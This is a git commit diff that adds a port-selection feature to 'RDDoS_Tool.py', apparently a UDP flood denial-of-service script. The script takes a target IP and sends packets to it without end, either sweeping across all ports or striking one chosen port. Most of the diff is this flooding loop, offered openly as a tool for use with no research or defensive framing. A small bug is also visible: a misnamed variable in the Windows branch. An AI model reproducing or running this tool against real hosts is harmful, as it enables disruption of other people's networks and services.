a5824e3256ba1d20888a95d626979dc1088fa838
Vladimir Rogozin <vladimir20040609@gmail.com>
2021-10-01 15:24:04 +0300

    Adding port selection feature

--- RDDoS_Tool.py
+++ RDDoS_Tool.py
@@ -13,11 +13,11 @@ version = "1.1"
 uname=system()
 
 if uname == "Windows":
-    cmd = 'cls'
+    cmd_clear_clear = 'cls'
 else:
-    cmd = 'clear'
+    cmd_clear = 'clear'
 
-os.system(cmd)
+os.system(cmd_clear)
 
 
 ##############
@@ -47,7 +47,7 @@ while True:
         break
 
     elif opt == '2':
-        ip = input("IP Address: ")
+        ip = str(input("IP Address: "))
         break
 
     elif opt == '3':
@@ -69,10 +69,10 @@ while True:
         goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
 
         if uname == "Windows":
-            cmd = 'cls'
+            cmd_clear = 'cls'
         else:
-            cmd = 'clear'
-        os.system(cmd)
+            cmd_clear = 'clear'
+        os.system(cmd_clear)
 
     elif opt == '4':
         exit()
@@ -80,10 +80,27 @@ while True:
     else:
         print('\033[91mInvaild Choice!\033[0m')
         time.sleep(2)
-        os.system(cmd)
+        os.system(cmd_clear)
 
-port = 1
-os.system(cmd)
+port_mode = False # If 'False' all ports will be use, if 'True' - certain.
+port = 2
+
+while 1:
+    port_bool = str(input("Certain port? [y/n]: "))
+
+    if (port_bool == "y") or (port_bool == "Y"):
+        port_mode = True
+        port = int(input("Port: "))
+        break
+
+    elif (port_bool == "n") or (port_bool == "N"):
+        break
+
+    else:
+        print('\033[91mInvaild Choice!\033[0m')
+        time.sleep(2)
+
+os.system(cmd_clear)
 print('\033[36;2mINITIALIZING....')
 time.sleep(1)
 print('STARTING...')
@@ -91,16 +108,35 @@ time.sleep(4)
 
 sent = 0
 
-try:
-    while True:
-        sock.sendto(bytes, (ip, port))
-        sent += 1
-        port += 1
-        print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
-        if port == 65534:
-            port = 1
-        elif port == 1900:
-            port = 1901
-            
-except:
-    print('\n\033[31;1mExited\033[0m')
+if port_mode == False:  # All ports.
+    try:
+        while True:
+            if port == 65534:
+                port = 1
+
+            elif port == 1900:
+                port = 1901
+
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            port += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
+    except:
+        print('\n\033[31;1mExited\033[0m')
+
+elif port_mode == True: # Certain port.
+    if port < 2:
+        port = 2
+    elif port == 65534:
+        port = 2
+
+    elif port == 1900:
+        port = 1901
+
+    try:
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
+    except:
+        print('\n\033[31;1mExited\033[0m')
